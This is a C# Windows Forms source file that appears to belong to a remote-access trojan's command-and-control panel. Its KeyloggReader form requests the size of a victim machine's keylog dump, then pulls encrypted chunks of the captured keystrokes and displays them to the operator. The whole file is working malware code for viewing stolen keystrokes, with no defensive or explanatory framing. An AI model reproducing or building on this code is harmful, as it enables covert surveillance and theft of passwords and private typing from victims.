using CNC.Core.Data;
using CNC.Core.Security;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace CNC.Forms
{
    public partial class KeyloggReader : Form
    {
        public Client currentClient;
        public string[] CachedKeylog;
        public KeyloggReader(Client client)
        {
            currentClient = client;
            InitializeComponent();

            string length = Cryptography.Decrypt(currentClient.Connection.SendReceiveObject<string, string>("GetKeylogDumpLengthReq", "GetKeylogDumpLengthRep", 10000,
              Cryptography.Encrypt(Guid.NewGuid().ToString())));
            CachedKeylog = new string[Convert.ToInt32(length)];
            scrollBar.Maximum = CachedKeylog.Length;
        }

        private void scrollBar_Scroll(object sender, ScrollEventArgs e)
        {
            RequestChunk(e.NewValue, (int)numRowsToShow.Value);
        }

        public void RequestChunk(int offset, int length)
        {
            if (!HaveAll(offset, length))
            {
                string message = currentClient.Connection.SendReceiveObject<string, string>("GetKeylogChunkReq", "GetKeylogChunkRep", 25000,
                    Cryptography.Encrypt(JsonConvert.SerializeObject(new int[] { offset, length })));
                string[] rows = JsonConvert.DeserializeObject<string[]>(Cryptography.Decrypt(message));

                int iterations = offset + length - 1;
                if (iterations > CachedKeylog.Length)
                    iterations = CachedKeylog.Length;

                for (int i = offset; i < iterations; i++)
                {
                    CachedKeylog[i] = rows[i - offset];
                }
            }
            UpdateTextBox();
        }


        private bool HaveAll(int offset, int length)
        {
            int iterations = offset + length - 1;
            if (iterations > CachedKeylog.Length)
                iterations = CachedKeylog.Length;

            for (int i = offset; i < iterations; i++)
            {
                if (string.IsNullOrEmpty(CachedKeylog[i]))
                    return false;
            }
            return true;
        }

        public void UpdateTextBox()
        {
            txtLog.Lines = CachedKeylog.Skip(scrollBar.Value).Take((int)numRowsToShow.Value).ToArray();
        }
    }
}
